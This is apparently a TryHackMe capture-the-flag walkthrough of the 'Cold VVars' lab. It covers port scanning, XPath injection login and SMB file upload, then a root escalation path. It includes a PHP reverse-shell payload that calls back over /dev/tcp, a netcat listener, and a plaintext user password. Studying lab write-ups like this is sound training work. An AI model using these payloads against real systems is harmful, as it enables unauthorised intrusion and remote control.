# Cold VVars

## Intial Scan

### nmap
```
┌──(lotus㉿lotus-pc)-[~/tryhackme/ColdVVars]
└─$ nmap -sC -sV -vv 10.201.7.168 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 15:42 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:42
Completed NSE at 15:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:42
Completed NSE at 15:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:42
Completed NSE at 15:42, 0.00s elapsed
Initiating Ping Scan at 15:42
Scanning 10.201.7.168 [4 ports]
Completed Ping Scan at 15:42, 0.42s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:42
Completed Parallel DNS resolution of 1 host. at 15:42, 0.00s elapsed
Initiating SYN Stealth Scan at 15:42
Scanning 10.201.7.168 [1000 ports]
Discovered open port 8080/tcp on 10.201.7.168
Discovered open port 139/tcp on 10.201.7.168
Discovered open port 445/tcp on 10.201.7.168
Discovered open port 22/tcp on 10.201.7.168
Discovered open port 8082/tcp on 10.201.7.168
Completed SYN Stealth Scan at 15:42, 2.01s elapsed (1000 total ports)
Initiating Service scan at 15:42
Scanning 5 services on 10.201.7.168
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Completed Service scan at 15:42, 11.56s elapsed (5 services on 1 host)
NSE: Script scanning 10.201.7.168.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:42
Completed NSE at 15:42, 7.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:42
Completed NSE at 15:42, 0.76s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:42
Completed NSE at 15:42, 0.00s elapsed
Nmap scan report for 10.201.7.168
Host is up, received timestamp-reply ttl 61 (0.20s latency).
Scanned at 2025-09-15 15:42:22 EDT for 22s
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b:b2:d3:57:3a:7c:ca:cf:9c:a3:dc:a1:1a:55:47:68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTphoaFpp0ZH9bdS1Ce0RIsljgVOIKLaUmUUFwi1mRAe8UREAhnHBDFeJV85jqvU/d0X0EhD45nG61gn7QsQILE0WgGArhLBR8Huv8J+vqdTOVwDZNyhh9w1kiIbLJWk6cPbyGggD2E7izh9NjS4xdFIFJtfGgsC2Ha2xjcREgUMHT306NpaIfxXbQ2+IRI8fzb+9Hj0l7VhyLaA/M3hHCMXwbWXD9kmoBA3jShZPa7xVclgXMGOMMut1cf0Y3bqIR8zs/FJ95b6PtZn1YLa96PyFUXv/e7f19uqevNoEGe+MbxaznStWNslVSE+L4yOSQmv5hqSoHzN5Xg4tbPw0s4T9SYw1LKpqW2qv88gHfN7uLR219QMqjy9P3bbv2JIsnqMbrj3x/sm1BC1YyHzxxLZdDXlxITqg7kQwASa/+aqMNYmwvL9FE3pTZocwvFcGI7r6KC49tXRQMAvlHZfI3ObvRRMlvSPfIAcGAj6ffJ7GXoQEpHCjufgV9MhkbQ8M=
|   256 51:30:cf:50:49:1c:94:e4:bb:37:8c:57:6b:f2:3b:17 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK0WeJjAIWj7ZDhGWOwTY3LCFGjRNj0PF1JAhB3/ZcIj/eCz5dZ7IfG7Br9y0mAWsn0PGjuS3xvEGDTCpTrjnWs=
|   256 93:c1:31:25:96:69:6d:f2:62:7c:e1:e6:21:34:e3:46 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILdRS+sqPZJQXLzJD18P1vEF+msDxcHmuoal0wcYQPVJ
139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4
445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4
8080/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
8082/tcp open  http        syn-ack ttl 61 Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-09-15T19:42:37
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 31438/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 27586/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38125/udp): CLEAN (Failed to receive data)
|   Check 4 (port 14691/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: IP-10-201-7-168, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   IP-10-201-7-168<00>  Flags: <unique><active>
|   IP-10-201-7-168<03>  Flags: <unique><active>
|   IP-10-201-7-168<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:42
Completed NSE at 15:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:42
Completed NSE at 15:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:42
Completed NSE at 15:42, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.32 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.060KB)

```

### Gobuster
```
┌──(lotus㉿lotus-pc)-[~/tryhackme/ColdVVars]
└─$ gobuster dir -u http://10.201.7.168:8080 -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.7.168:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/dev                  (Status: 301) [Size: 317] [--> http://10.201.7.168:8080/dev/]
/index.html           (Status: 200) [Size: 10918]
/index.php            (Status: 200) [Size: 4]
/server-status        (Status: 403) [Size: 279]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
```
┌──(lotus㉿lotus-pc)-[~/tryhackme/ColdVVars]
└─$ gobuster dir -u http://10.201.7.168:8082 -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.7.168:8082
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 1605]
/Login                (Status: 200) [Size: 1605]
Progress: 2637 / 4615 (57.14%)
Progress: 2712 / 4615 (58.76%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 2723 / 4615 (59.00%)
===============================================================
Finished
===============================================================
```





## Webpage

### port 8082
<img width="1919" height="885" alt="image" src="https://github.com/user-attachments/assets/d6e41c37-8135-44b1-a0ca-38b000f9cc4e" />

### port 8082 with `/login`

<img width="1918" height="790" alt="image" src="https://github.com/user-attachments/assets/6bd57fc6-1acf-4e0a-8cce-efb53446e495" />

## Login via Xpath injection

<img width="512" height="488" alt="image" src="https://github.com/user-attachments/assets/17d7669b-20c7-4231-8000-24f146eb8bad" />

<img width="790" height="232" alt="image" src="https://github.com/user-attachments/assets/31c08be0-f107-42ac-bef1-863adeeb25ac" />

## Accessing smb

```
┌──(lotus㉿lotus-pc)-[~/tryhackme/ColdVVars]
└─$ smbclient -L \\10.201.7.168
Password for [WORKGROUP\lotus]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        SECURED         Disk      Dev
        IPC$            IPC       IPC Service (ip-10-201-7-168 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.201.7.168 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```
















<img width="776" height="261" alt="image" src="https://github.com/user-attachments/assets/c7bafd5f-3a31-4fe0-9a41-784159eaac44" />

```
smbclient -L \\10.201.7.168
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	SECURED         Disk      Dev
	IPC$            IPC       IPC Service (ip-10-201-7-168 server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

```
smbclient  \\\\10.201.7.168\\SECURED -U ArthurMorgan
Password for [WORKGROUP\ArthurMorgan]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Mar 21 23:04:28 2021
  ..                                  D        0  Thu Mar 11 12:52:29 2021
  note.txt                            N       45  Thu Mar 11 12:19:52 2021

		7708812 blocks of size 1024. 959672 blocks available
smb: \> get note.txt 
getting file \note.txt of size 45 as note.txt (22.0 KiloBytes/sec) (average 22.0 KiloBytes/sec)
smb: \> exit
```

```
cat note.txt 
Secure File Upload and Testing Functionality
```

nano `test.txt `
```
testing
```

```
smb: \> put test.txt
```

<img width="1134" height="219" alt="image" src="https://github.com/user-attachments/assets/e2ed5c45-898c-4f47-b635-bb6dac1b3e1c" />

## Reverse Shell

```
┌──(lotus㉿lotus-pc)-[~/tryhackme/ColdVVars]
└─$ sudo nano rev.php      
[sudo] password for lotus: 
                                                                                                               
┌──(lotus㉿lotus-pc)-[~/tryhackme/ColdVVars]
└─$ cat rev.php 
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.3.219/4444 0>&1'");
?>
                                                                                                             
```

```
smb: \> put rev.php
putting file rev.php as \rev.php (0.1 kb/s) (average 0.1 kb/s) 
```

<img width="706" height="138" alt="image" src="https://github.com/user-attachments/assets/b8a40398-abe8-46e7-8870-2f4239ecfcb5" />

```
┌──(lotus㉿lotus-pc)-[~/tryhackme/ColdVVars]
└─$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.201.7.168 47990
bash: cannot set terminal process group (873): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-201-7-168:/var/www/html/dev$ 

```

## User.txt
```
www-data@ip-10-201-7-168:/var/www/html/dev$ /bin/sh -i
/bin/sh -i
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-201-7-168:/var/www/html/dev$ su ArthurMorgan
su ArthurMorgan
Password: DeadEye

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
ArthurMorgan@ip-10-201-7-168:/var/www/html/dev$ 
```

<img width="513" height="168" alt="image" src="https://github.com/user-attachments/assets/e1427688-928b-4f9a-ac69-7400fd89200a" />


## Root

```
ArthurMorgan@ip-10-201-7-168:~$ env
env
SHELL=/bin/sh
PWD=/home/ArthurMorgan
LOGNAME=ArthurMorgan
OPEN_PORT=4545    <------------------------------
XDG_SESSION_TYPE=tty
APACHE_LOG_DIR=/var/log/apache2
HOME=/home/ArthurMorgan
LANG=en_US.UTF-8
INVOCATION_ID=4d250513c28b460f908816a0cfe421b8
APACHE_PID_FILE=/var/run/apache2/apache2.pid
XDG_SESSION_CLASS=user
USER=ArthurMorgan
APACHE_RUN_GROUP=www-data
APACHE_LOCK_DIR=/var/lock/apache2
SHLVL=4
XDG_SESSION_ID=c4
LC_CTYPE=C.UTF-8
XDG_RUNTIME_DIR=/run/user/1001
APACHE_RUN_DIR=/var/run/apache2
JOURNAL_STREAM=8:25067
APACHE_RUN_USER=www-data
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
MAIL=/var/mail/ArthurMorgan
OLDPWD=/home
_=/usr/bin/env
ArthurMorgan@ip-10-201-7-168:~$ 
```

```
ArthurMorgan@ip-10-201-7-168:~$ nc -lnp 4545
nc -lnp 4545


ideaBox
1.Write
2.Delete
3.Steal others' Trash
4.Show'nExit

4
4
```



<img width="952" height="526" alt="image" src="https://github.com/user-attachments/assets/780a29ed-2c44-48c1-8721-565c8652569f" />

<img width="531" height="493" alt="image" src="https://github.com/user-attachments/assets/297cd353-6157-42ef-97e1-c47519841b41" />

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
marston@ip-10-201-97-129:~$ 

```

```
marston@ip-10-201-97-129:~$ tmux ls
tmux ls
tmux ls
0: 9 windows (created Mon Sep 15 20:43:49 2025)
marston@ip-10-201-97-129:~$ 
```

```
┌──(lotus㉿lotus-pc)-[~/tryhackme/ColdVVars]
└─$ stty raw -echo;fg
[1]  + continued  sudo nc -lnvp 4444
```
or

<img width="1695" height="384" alt="image" src="https://github.com/user-attachments/assets/5190babb-9f7c-401c-9ec0-8351507b8641" />





